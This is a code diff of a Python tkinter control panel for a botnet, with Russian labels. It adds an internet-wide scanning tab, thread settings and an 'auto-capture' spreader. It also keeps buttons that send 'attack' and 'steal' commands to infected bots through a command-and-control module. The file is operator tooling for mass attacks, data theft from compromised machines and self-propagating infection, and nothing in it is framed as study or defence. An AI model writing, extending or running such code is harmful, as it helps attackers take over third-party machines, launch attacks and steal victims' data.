@@ -1,7 +1,6 @@
 import tkinter as tk
-from tkinter import ttk, messagebox, simpledialog
-import json, os, threading
-import folium, webbrowser
+from tkinter import ttk, messagebox, simpledialog, scrolledtext
+import json, os, threading, queue, ipaddress
 from botnet.c2 import broadcast_command
 from utils.logger import log
 from utils.widgets import ToolTip
@@ -18,17 +17,14 @@ class BotnetTab(tk.Frame):
     def build_ui(self):
         nb = ttk.Notebook(self)
         nb.pack(fill=tk.BOTH, expand=True)
-        # Список
+
+        # Вкладка "Список"
         list_frame = ttk.Frame(nb)
         nb.add(list_frame, text="Список")
         control_frame = ttk.Frame(list_frame)
         control_frame.pack(fill=tk.X, padx=5, pady=5)
-        refresh_btn = ttk.Button(control_frame, text="Обновить", command=self.load_bots)
-        refresh_btn.pack(side=tk.LEFT, padx=2)
-        mass_btn = ttk.Button(control_frame, text="Массовая атака", command=self.mass_attack)
-        mass_btn.pack(side=tk.LEFT, padx=2)
-        scan_btn = ttk.Button(control_frame, text="Масс-сканер", command=self.mass_scanner)
-        scan_btn.pack(side=tk.LEFT, padx=2)
+        ttk.Button(control_frame, text="Обновить", command=self.load_bots).pack(side=tk.LEFT, padx=2)
+        ttk.Button(control_frame, text="Массовая атака", command=self.mass_attack).pack(side=tk.LEFT, padx=2)
         filter_frame = ttk.Frame(list_frame)
         filter_frame.pack(fill=tk.X, padx=5)
         ttk.Label(filter_frame, text="Фильтр:").pack(side=tk.LEFT)
@@ -45,27 +41,126 @@ class BotnetTab(tk.Frame):
         self.context_menu = tk.Menu(self, tearoff=0)
         self.context_menu.add_command(label="Атаковать", command=self.context_attack)
         self.context_menu.add_command(label="Сбор данных", command=self.context_steal)
-        self.progress = ttk.Progressbar(list_frame, mode="indeterminate")
-        self.progress.pack(fill=tk.X, padx=5, pady=2)
         self.status_label = ttk.Label(list_frame, text="Ботов: 0")
         self.status_label.pack(anchor=tk.W, padx=5)
-        # Автозахват
+
+        # Вкладка "Сканирование"
+        scan_frame = ttk.Frame(nb)
+        nb.add(scan_frame, text="Сканирование")
+        
+        settings_frame = ttk.LabelFrame(scan_frame, text="Параметры")
+        settings_frame.pack(fill=tk.X, padx=5, pady=5)
+        ttk.Label(settings_frame, text="Диапазон (CIDR):").grid(row=0, column=0, padx=5, sticky=tk.W)
+        self.scan_target = ttk.Entry(settings_frame, width=30)
+        self.scan_target.grid(row=0, column=1, padx=5)
+        self.scan_target.insert(0, "192.168.1.0/24")
+        ttk.Label(settings_frame, text="Потоков:").grid(row=1, column=0, padx=5, sticky=tk.W)
+        self.scan_threads = ttk.Entry(settings_frame, width=10)
+        self.scan_threads.grid(row=1, column=1, padx=5, sticky=tk.W)
+        self.scan_threads.insert(0, "500")
+        
+        btn_frame = ttk.Frame(scan_frame)
+        btn_frame.pack(fill=tk.X, padx=5, pady=5)
+        ttk.Button(btn_frame, text="Сканировать интернет", command=self.scan_internet).pack(side=tk.LEFT, padx=2)
+        ttk.Button(btn_frame, text="Сканировать диапазон", command=self.scan_range).pack(side=tk.LEFT, padx=2)
+        ttk.Button(btn_frame, text="Остановить", command=self.stop_scan).pack(side=tk.LEFT, padx=2)
+        ttk.Button(btn_frame, text="Копировать лог", command=self.copy_log).pack(side=tk.LEFT, padx=2)
+        
+        self.scan_log = scrolledtext.ScrolledText(scan_frame, height=12, state=tk.NORMAL)
+        self.scan_log.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
+
+        # Вкладка "Автозахват"
         auto_frame = ttk.Frame(nb)
         nb.add(auto_frame, text="Автозахват")
-        ttk.Label(auto_frame, text="Статус:").grid(row=0, column=0, padx=5, pady=5, sticky=tk.W)
+        ttk.Label(auto_frame, text="Статус:").grid(row=0, column=0, padx=5, sticky=tk.W)
         self.auto_status_label = ttk.Label(auto_frame, text="Неактивен")
         self.auto_status_label.grid(row=0, column=1, sticky=tk.W)
         self.toggle_btn = ttk.Button(auto_frame, text="Запустить", command=self.toggle_spreader)
         self.toggle_btn.grid(row=1, column=0, padx=5, pady=5)
         ttk.Button(auto_frame, text="Применить настройки", command=self.reload_spreader).grid(row=1, column=1, padx=5)
-        ttk.Label(auto_frame, text="Интервал (мин):").grid(row=2, column=0, padx=5, sticky=tk.W)
+        ttk.Label(auto_frame, text="Интервал (сек):").grid(row=2, column=0, padx=5, sticky=tk.W)
         self.interval_var = tk.StringVar(value="30")
         ttk.Entry(auto_frame, textvariable=self.interval_var, width=10).grid(row=2, column=1, padx=5, sticky=tk.W)
-        ttk.Label(auto_frame, text="Диапазоны:").grid(row=3, column=0, padx=5, sticky=tk.W)
-        self.ranges_text = tk.Text(auto_frame, height=4, width=30)
-        self.ranges_text.grid(row=3, column=1, padx=5, pady=5)
-        self.load_auto_settings()
+        ttk.Label(auto_frame, text="Потоков:").grid(row=3, column=0, padx=5, sticky=tk.W)
+        self.auto_threads_var = tk.StringVar(value="500")
+        ttk.Entry(auto_frame, textvariable=self.auto_threads_var, width=10).grid(row=3, column=1, padx=5, sticky=tk.W)
 
+        self.process_messages()
+
+    def log_to_scan(self, message):
+        self.scan_log.insert(tk.END, message + "\n")
+        self.scan_log.see(tk.END)
+
+    def copy_log(self):
+        self.clipboard_clear()
+        self.clipboard_append(self.scan_log.get(1.0, tk.END))
+        messagebox.showinfo("Скопировано", "Лог скопирован в буфер обмена")
+
+    def process_messages(self):
+        try:
+            while True:
+                msg = self.spreader.message_queue.get_nowait()
+                self.log_to_scan(msg)
+        except queue.Empty:
+            pass
+        self.after(100, self.process_messages)
+
+    def scan_internet(self):
+        self.spreader.stop()
+        self.spreader.load_settings("avz_settings.json")
+        self.spreader.worker_threads = int(self.scan_threads.get())
+        self.spreader.interval = 0
+        threading.Thread(target=self._run_scan_once_global, daemon=True).start()
+
+    def _run_scan_once_global(self):
+        self.spreader.start()
+
+    def scan_range(self):
+        target = self.scan_target.get()
+        if not target: return
+        if '/' in target:
+            try:
+                network = ipaddress.IPv4Network(target, strict=False)
+                targets = [str(host) for host in network.hosts()]
+            except:
+                messagebox.showerror("Ошибка", "Некорректный CIDR")
+                return
+        else:
+            targets = [target]
+        self.spreader.scan_once(targets)
+
+    def stop_scan(self):
+        self.spreader.stop()
+        self.log_to_scan("[Сканирование] Остановлено")
+
+    def toggle_spreader(self):
+        if self.spreader.running:
+            self.spreader.stop()
+            self.auto_status_label.config(text="Неактивен")
+            self.toggle_btn.config(text="Запустить")
+        else:
+            self.save_auto_settings()
+            self.spreader.load_settings("avz_settings.json")
+            self.spreader.start()
+            self.auto_status_label.config(text="Активен")
+            self.toggle_btn.config(text="Остановить")
+
+    def save_auto_settings(self):
+        try:
+            with open("avz_settings.json","r") as f: s = json.load(f)
+        except: s = {}
+        s["auto_spread_interval_min"] = int(self.interval_var.get()) / 60
+        s["spread_worker_threads"] = int(self.auto_threads_var.get())
+        s["auto_spread_enabled"] = True
+        with open("avz_settings.json","w") as f:
+            json.dump(s, f, indent=2)
+
+    def reload_spreader(self):
+        self.save_auto_settings()
+        self.spreader.load_settings("avz_settings.json")
+        self.log_to_scan("[Автозахват] Настройки обновлены")
+
+    # --- Полные методы для списка ботов ---
     def load_bots(self):
         if os.path.exists("bots.json"):
             with open("bots.json", "r") as f:
@@ -137,55 +232,13 @@ class BotnetTab(tk.Frame):
             target = simpledialog.askstring("Атака", "Цель:")
             if target:
                 broadcast_command({"action":"attack","target":target,"bot_id":bot['id']})
+
     def context_steal(self):
         bot = self.get_selected_bot()
         if bot:
             broadcast_command({"action":"steal","bot_id":bot['id']})
+
     def mass_attack(self):
         target = simpledialog.askstring("Массовая атака", "Цель:")
         if target:
-            self.progress.start()
-            threading.Thread(target=lambda: broadcast_command({"action":"attack","target":target})).start()
-            self.progress.stop()
-    def mass_scanner(self):
-        ip_range = simpledialog.askstring("Сканер", "Диапазон:")
-        if ip_range:
-            log(f"Сканирую {ip_range}")
-    def load_auto_settings(self):
-        try:
-            with open("avz_settings.json") as f:
-                s = json.load(f)
-            self.interval_var.set(str(s.get("auto_spread_interval_min",30)))
-            self.ranges_text.delete(1.0,tk.END)
-            for r in s.get("auto_spread_ranges",[]):
-                self.ranges_text.insert(tk.END, r+"\n")
-            if s.get("auto_spread_enabled"):
-                self.auto_status_label.config(text="Активен")
-                self.toggle_btn.config(text="Остановить")
-        except: pass
-    def toggle_spreader(self):
-        if self.spreader.running:
-            self.spreader.stop()
-            self.auto_status_label.config(text="Неактивен")
-            self.toggle_btn.config(text="Запустить")
-        else:
-            self.save_auto_settings()
-            self.spreader.load_settings("avz_settings.json")
-            self.spreader.start()
-            self.auto_status_label.config(text="Активен")
-            self.toggle_btn.config(text="Остановить")
-    def save_auto_settings(self):
-        try:
-            with open("avz_settings.json","r") as f:
-                s = json.load(f)
-            s["auto_spread_interval_min"] = int(self.interval_var.get())
-            s["auto_spread_ranges"] = self.ranges_text.get(1.0,tk.END).strip().split("\n")
-            s["auto_spread_enabled"] = True
-            with open("avz_settings.json","w") as f:
-                json.dump(s, f, indent=2)
-            messagebox.showinfo("Настройки", "Сохранено")
-        except Exception as e:
-            messagebox.showerror("Ошибка", str(e))
-    def reload_spreader(self):
-        self.save_auto_settings()
-        self.spreader.load_settings("avz_settings.json")
+            broadcast_command({"action":"attack","target":target})
